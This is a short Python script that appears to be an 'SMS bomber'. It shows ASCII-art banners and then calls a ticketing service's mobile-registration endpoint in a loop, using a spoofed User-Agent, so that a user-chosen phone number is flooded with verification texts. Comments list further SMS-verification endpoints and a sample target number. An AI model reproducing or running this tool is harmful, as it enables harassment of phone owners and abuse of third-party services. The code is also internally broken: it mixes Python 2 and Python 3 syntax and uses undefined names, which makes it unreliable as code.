#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from os import name, system
from os.path import exists, isfile
from random import choice, randint
from threading import Thread
from time import sleep
from colorama import Fore, Style
from requests import get, post
from user_agent import generate_user_agent
import os
#python2
#from urllib.request import Request,urlopen
import urllib2,cookielib
#from urllib.parse import urlencode
import platform
import time 


print("LOADING. 3 SEC")
sleep(1)
print("LOADING. 2 SEC")
sleep(1)
print("LOADING. 1 SEC")
sleep(3)
os.system('cls||clear')
print("COMPLETE! - files in place")
sleep(3)
os.system('cls||clear')

print("")   
print("     ███████╗██╗░░░░░░█████╗░░██╗░░░░░░░██╗██╗░░██╗")
print("    ██╔════╝██║░░░░░██╔══██╗░██║░░██╗░░██║╚██╗██╔╝")
print("    █████╗░░██║░░░░░██║░░██║░╚██╗████╗██╔╝░╚███╔╝░")
print("    ██╔══╝░░██║░░░░░██║░░██║░░████╔═████║░░██╔██╗░")
print("     ██║░░░░░███████╗╚█████╔╝░░╚██╔╝░╚██╔╝░██╔╝╚██╗")
print("     ╚═╝░░░░░╚══════╝░╚════╝░░░░╚═╝░░░╚═╝░░╚═╝░░╚═╝") 	
 
sleep(3);
os.system('cls||clear')

print("")
print("            ██████╗░███████╗██╗░░░██╗██╗")
print("            ██╔══██╗██╔════╝██║░░░██║╚═╝")
print("            ██║░░██║█████╗░░╚██╗░██╔╝░░░")
print("            ██║░░██║██╔══╝░░░╚████╔╝░░░░")
print("            ██████╔╝███████╗░░╚██╔╝░░██╗")
print("            ╚═════╝░╚══════╝░░░╚═╝░░░╚═╝")


sleep(1);
os.system('cls||clear')

print("")
print("     ░█─── ─▀─ █── ░█─▄▀ █▀▀█ █▀▀█ █─█ █▀▀█ █▀▀▄ ")
print("     ░█─── ▀█▀ █── ░█▀▄─ █▄▄▀ █▄▀█ █▀▄ █▄▀█ █──█ ")
print("     ░█▄▄█ ▀▀▀ ▀▀▀ ░█─░█ ▀─▀▀ █▄▄█ ▀─▀ █▄▄█ ▀▀▀─ ")
print("")
print("     █▀▀ █▀▀▄ █▀▀▄ ▀▀█▀▀ █▀▀ █▀▀█ █▀▀█ █▀▀█ █▀▀█")
print("     █▀▀ █──█ █──█ ──█── █▀▀ █▄▄▀ █▄▄▀ █──█ █▄▄▀")
print("     ▀▀▀ ▀──▀ ▀▀▀─ ──▀── ▀▀▀ ▀─▀▀ ▀─▀▀ ▀▀▀▀ ▀─▀▀")

#https://securedapi.confirmtkt.com/api/platform/register?mobileNumber=

#http://t.justdial.com/api/india_api_write/10aug2016/sendvcode.php?mobile=

#https://securedapi.confirmtkt.com/api/platform/register?mobileNumber=

def send(num, counter, slep):
    #url = ["https://securedapi.confirmtkt.com/api/platform/register?mobileNumber=","https://m.naaptol.com/faces/jsp/ajax/ajax.jsp?actionname=checkMobileUserExists&mobile=","https://t.justdial.com/api/india_api_write/10aug2016/sendvcode.php?mobile="]
    url="https://securedapi.confirmtkt.com/api/platform/register?mobileNumber="
    #data={"phone":num}
    hdr = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11','Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8','Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3','Accept-Encoding': 'none','Accept-Language': 'en-US,en;q=0.8','Connection': 'keep-alive'}
    result_url=url+num
    req = urllib2.Request(result_url, headers=hdr)
    for x in range(counter):
        banner()
        #print("Target Number          : 01531999473", num)
        #print("Number of Message Sent : ", x+1)
        page = urllib2.urlopen(req)
        #resp1=Request(result_url)
        #urlopen(resp1)
        time.sleep(slep)

try:
    banner()
    number = raw_input("Enter mobileNumber: ")
    count = raw_input("Enter number of Message: ")
    throttle = raw_input("Enter time of sleep: ")
    send(number,int(count), int(throttle))
except Exception as e:
    print(f"{BRIGHT}{RED} Что-то работает не правильно, перезагрузите скрипт! ")
    
